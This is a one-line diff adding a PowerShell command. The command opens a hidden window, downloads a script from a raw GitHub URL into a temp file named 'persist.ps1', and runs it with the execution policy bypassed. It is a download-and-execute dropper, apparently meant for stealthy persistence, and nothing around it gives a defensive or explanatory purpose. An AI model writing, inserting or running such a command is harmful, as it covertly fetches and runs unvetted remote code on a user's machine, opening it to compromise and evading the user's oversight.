@@ -1,0 +1,1 @@
+powershell -WindowStyle Hidden -Command \" $url='https://raw.githubusercontent.com/tanishqDevx/code_ps/main/code2.ps1'; $temp='$env:TEMP\\\\persist.ps1'; Invoke-WebRequest -Uri $url -OutFile $temp; PowerShell -ExecutionPolicy Bypass -WindowStyle Hidden -File $temp\"
